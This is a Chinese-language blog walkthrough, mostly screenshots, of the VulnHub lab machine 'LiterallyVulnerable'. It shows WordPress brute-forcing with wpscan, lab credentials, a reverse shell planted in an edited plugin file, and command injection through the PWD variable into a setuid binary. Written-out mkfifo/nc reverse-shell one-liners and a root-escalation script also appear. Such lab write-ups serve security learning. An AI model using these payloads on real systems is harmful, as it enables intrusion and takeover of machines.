---
layout: post
title:  "vulnhub >_ LiterallyVulnerable"
description: walkthrough
category: vulnhub
---
# LiterallyVulnerable

![image-20200713222221001]({{ site.url }}/assets/LiterallyVulnerable.assets/image-20200713222221001.png)

![image-20200713223445927]({{ site.url }}/assets/LiterallyVulnerable.assets/image-20200713223445927.png)

![image-20200713224443396]({{ site.url }}/assets/LiterallyVulnerable.assets/image-20200713224443396.png)

![image-20200714014817277]({{ site.url }}/assets/LiterallyVulnerable.assets/image-20200714014817277.png)

![image-20200714015246460]({{ site.url }}/assets/LiterallyVulnerable.assets/image-20200714015246460.png)

80

![image-20200714015815871]({{ site.url }}/assets/LiterallyVulnerable.assets/image-20200714015815871.png)

显示不正确，先加个hosts

![image-20200714015859359]({{ site.url }}/assets/LiterallyVulnerable.assets/image-20200714015859359.png)

![image-20200714020013972]({{ site.url }}/assets/LiterallyVulnerable.assets/image-20200714020013972.png)

![image-20200714020129568]({{ site.url }}/assets/LiterallyVulnerable.assets/image-20200714020129568.png)

![4]({{ site.url }}/assets/LiterallyVulnerable.assets/image-20200714020512891.png)

admin用户确认。

利用之前的密码名单尝试暴力

```bash
wpscan --url http://literally.vulnerable/ -e u,vp -P backupPasswords
```

 wpscan

![image-20200714022902910]({{ site.url }}/assets/LiterallyVulnerable.assets/image-20200714022902910.png)

又一个wp

![image-20200714023118484]({{ site.url }}/assets/LiterallyVulnerable.assets/image-20200714023118484.png)



![image-20200714024915017]({{ site.url }}/assets/LiterallyVulnerable.assets/image-20200714024915017.png)



![image-20200714024716629]({{ site.url }}/assets/LiterallyVulnerable.assets/image-20200714024716629.png)



在其中的帖子中发现

![image-20200714024821740]({{ site.url }}/assets/LiterallyVulnerable.assets/image-20200714024821740.png)

看来密码应该是用在这里的

同样的密码名单在65535端口上再次做同样的尝试

![image-20200714024055228]({{ site.url }}/assets/LiterallyVulnerable.assets/image-20200714024055228.png)

```bash
maybeadmin
$EPid%J2L9LufO5
```

登录成功。

![image-20200714030143544]({{ site.url }}/assets/LiterallyVulnerable.assets/image-20200714030143544.png)

在已经发布的页面中查看被密码保护的帖子

![image-20200714030000867]({{ site.url }}/assets/LiterallyVulnerable.assets/image-20200714030000867.png)

一个新的凭证

![image-20200714030503566]({{ site.url }}/assets/LiterallyVulnerable.assets/image-20200714030503566.png)

```bash
notadmin:Pa$$w0rd13!&
```

成功重新登录

![image-20200714030634840]({{ site.url }}/assets/LiterallyVulnerable.assets/image-20200714030634840.png)

登录后台通过修改404提交rshell

![image-20200714031031348]({{ site.url }}/assets/LiterallyVulnerable.assets/image-20200714031031348.png)

![image-20200714031113664]({{ site.url }}/assets/LiterallyVulnerable.assets/image-20200714031113664.png)

报错。尝试修改插件

![image-20200714031256174]({{ site.url }}/assets/LiterallyVulnerable.assets/image-20200714031256174.png)

![image-20200714031315282]({{ site.url }}/assets/LiterallyVulnerable.assets/image-20200714031315282.png)

成功

```bash
http://literally.vulnerable:65535/phpcms/wp-content/plugins/akismet/akismet.php
```

浏览器浏览。在监听端口获得shell

![image-20200714031634455]({{ site.url }}/assets/LiterallyVulnerable.assets/image-20200714031634455.png)

两个用户

![image-20200714031810188]({{ site.url }}/assets/LiterallyVulnerable.assets/image-20200714031810188.png)

![image-20200714033022926]({{ site.url }}/assets/LiterallyVulnerable.assets/image-20200714033022926.png)

分析一下这个二进制程序

![image-20200714033331295]({{ site.url }}/assets/LiterallyVulnerable.assets/image-20200714033331295.png)

![image-20200714033412814]({{ site.url }}/assets/LiterallyVulnerable.assets/image-20200714033412814.png)

尝试运行

![image-20200714033305286]({{ site.url }}/assets/LiterallyVulnerable.assets/image-20200714033305286.png)

所以是抓取了当前路径。echo出来，如果路径指向文件，则能以root越权echo其他用户的文件

同样的我们可以通过伪造目录向这个程序注入命令。

尝试一下

![image-20200714034601720]({{ site.url }}/assets/LiterallyVulnerable.assets/image-20200714034601720.png)

简单的成功注入

再次修改，尝试获得shell，尝试很多种语句，最终确定下面的语句

```bash
export PWD=';rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.110.132 1338 >/tmp/f'
./itseasy
```

![image-20200714035907266]({{ site.url }}/assets/LiterallyVulnerable.assets/image-20200714035907266.png)

![image-20200714035952205]({{ site.url }}/assets/LiterallyVulnerable.assets/image-20200714035952205.png)

成功切换到 john

![image-20200714040204273]({{ site.url }}/assets/LiterallyVulnerable.assets/image-20200714040204273.png)

在目录下枚举

![image-20200714040321106]({{ site.url }}/assets/LiterallyVulnerable.assets/image-20200714040321106.png)

![image-20200714040442975]({{ site.url }}/assets/LiterallyVulnerable.assets/image-20200714040442975.png)

发现john的凭证

```bash
john:YZW$s8Y49IB#ZZJ
```

有凭证之后肯定要查看sudo

![image-20200714040610072]({{ site.url }}/assets/LiterallyVulnerable.assets/image-20200714040610072.png)

html路径权限是www-data权限。

返回之前的shell

通过echo伪造test.html

```bash
echo '#!/bin/bash' > test.html
echo 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.110.132 1339 >/tmp/f' >> test.html
```

![image-20200714041437905]({{ site.url }}/assets/LiterallyVulnerable.assets/image-20200714041437905.png)

增加运行权限

![image-20200714041818532]({{ site.url }}/assets/LiterallyVulnerable.assets/image-20200714041818532.png)

在1339建立监听

我们已经有john的凭证，直接ssh登录。john

```bash
ssh john@192.168.110.135
```

通过运行获得root shell

![image-20200714041910022]({{ site.url }}/assets/LiterallyVulnerable.assets/image-20200714041910022.png)

![image-20200714042132754]({{ site.url }}/assets/LiterallyVulnerable.assets/image-20200714042132754.png)

